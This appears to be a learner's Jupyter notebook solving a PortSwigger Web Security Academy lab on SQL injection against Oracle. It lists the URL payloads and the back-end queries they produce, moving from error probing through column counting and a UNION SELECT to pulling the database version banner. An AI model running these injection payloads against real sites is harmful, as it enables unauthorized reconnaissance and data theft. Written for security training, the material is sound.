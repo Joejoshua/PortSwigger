{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab: SQL injection attack, querying the database type and version on Oracle\n",
    "\n",
    "- sqli: product category fillter\n",
    "- end goal: display the database version string"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Analysis\n",
    "- url: `https://0a3f004e032b939c80bb081500cb0036.web-security-academy.net/`\n",
    "\n",
    "- front-end: `/filter?category=Gifts`\n",
    "- back-end:\n",
    "```sql\n",
    "select * from product where category = 'Gifts' and released = 1\n",
    "``` \n",
    "\n",
    "- check sqli vulnerability\n",
    "- front-end: `/filter?category=Gifts'`\n",
    "- back-end:\n",
    "```sql\n",
    "select * from product where category = 'Gifts'' and released = 1\n",
    "'-- 500 Internal Server Error\n",
    "``` \n",
    "\n",
    "- front-end: `/filter?category=Gifts'--`\n",
    "- back-end:\n",
    "```sql\n",
    "select * from product where category = 'Gifts'--' and released = 1\n",
    "-- 200 OK\n",
    "```\n",
    "\n",
    "- determine how many columns are contain in this website\n",
    "- front-end: `/filter?category=Gifts' order by 2--`\n",
    "- back-end:\n",
    "```sql\n",
    "select * from product where category = 'Gifts' order by 2--' and released = 1\n",
    "-- found 2 columns\n",
    "```\n",
    "\n",
    "- determine type of data are contain in the columns\n",
    "- front-end: `/filter?category=Gifts' union select 'a', 'a' from dual--`\n",
    "- back-end:\n",
    "```sql\n",
    "select * from product where category = 'Gifts' union select 'a', 'a' from dual--' and released = 1\n",
    "-- Oracle: 200 OK: both columns are text \n",
    "```\n",
    "\n",
    "- display the database version \n",
    "- front-end: `/filter?category=Gifts' union select banner, null from v$version--`\n",
    "- back-end:\n",
    "```sql\n",
    "select * from product where category = 'Gifts' union select banner, null from v$version--' and released = 1\n",
    "-- 200 OK \n",
    "```\n",
    "- Congratulations, you solved the lab!"
   ]
  }
 ],
 "metadata": {
  "language_info": {
   "name": "python"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
